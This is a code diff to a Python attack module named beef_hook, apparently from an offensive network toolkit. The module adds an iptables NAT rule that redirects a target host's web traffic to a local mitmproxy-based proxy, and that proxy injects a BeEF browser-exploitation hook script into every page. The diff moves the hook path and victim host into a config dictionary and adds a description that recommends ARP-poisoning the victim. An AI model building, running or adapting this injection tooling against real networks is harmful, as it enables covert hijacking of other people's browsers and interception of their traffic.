@@ -9,38 +9,43 @@ class beef_hook(Attack):
         and it's dependencies
     """
     def __init__(self):
-        self.hook_path    = None
+        super(beef_hook, self).__init__("BeEF Hook")
         self.proxy_server = None
         self.hooker       = None
-        self.hooked_host  = None
         self.hook_script  = "<script src=\"{0}\"></script>"
         self.iptable_http = "iptables -t nat -A PREROUTING -p tcp --dport 80 -s {0} -j REDIRECT --to-port 5544"
-        super(beef_hook, self).__init__("BeEF Hook")
+        self.config.update({"hook_path": {"type":"str", 
+                                          "value":None, 
+                                          "required":True, 
+                                          "display":"Path to BeEF hook"},
+                            "hooked_host": {"type":"ip", 
+                                            "value":None,
+                                            "required":True, 
+                                            "display":"Host to hook"}
+                            })
+        self.info = """
+                    BeEF (Browser Exploitation Framework) is a tool used in
+                    the exploitation of browsers.  This module serves as a 
+                    way to hook any browser without the need for an XSS
+                    or other malicious client-facing vector.  Instead,
+                    when an attacker is local to a victim, this module
+                    will inject each page with a hook.
+
+                    ARP poisoning the victim is suggested, as traffic from
+                    the victim is required."""
 
     def modip_rule(self, enable=True):
         """ enables or disables the iptable rule for forwarding traffic locally
         """
         if enable:
-            util.init_app(self.iptable_http.format(self.hooked_host))
+            util.init_app(self.iptable_http.format
+                                    (self.config['hooked_host']['value']))
         else:
-            util.init_app(self.iptable_http.replace('-A', '-D').format(self.hooked_host))
+            util.init_app(self.iptable_http.replace('-A', '-D').format
+                                            (self.config['hooked_host']['value']))
 
     def initialize(self):
-        while True:
-            try:
-                self.hook_path   = raw_input('[!] Enter path to BeEF Hook: ')
-                self.hooked_host = raw_input('[!] Enter host to hook: ')
-
-                tmp = raw_input('[!] Hooking host \'%s\'.  Is this correct? [Y/n] ' % self.hooked_host)
-                if 'n' in tmp.lower():
-                    return None
-                break
-            except KeyboardInterrupt:
-                return None
-            except Exception, e:
-                util.Error(e)
-
-        self.hook_script = self.hook_script.format(self.hook_path)
+        self.hook_script = self.hook_script.format(self.config['hook_path']['value'])
         self.modip_rule()
 
         self.running = True
@@ -56,7 +61,7 @@ class beef_hook(Attack):
         thread = Thread(target=self.hooker.run)
         thread.start()
 
-        return self.hooked_host
+        return self.config['hooked_host']['value']
 
     def shutdown(self):
         """ Disable the iptable rule and kill the proxy server
@@ -69,7 +74,8 @@ class beef_hook(Attack):
     def session_view(self):
         """ Return the host we're hooking
         """
-        return self.hooked_host
+        return self.config['hooked_host']['value']
+
 
 class Hooker(controller.Master):
     """ Request handler for libmproxy; takes care of our
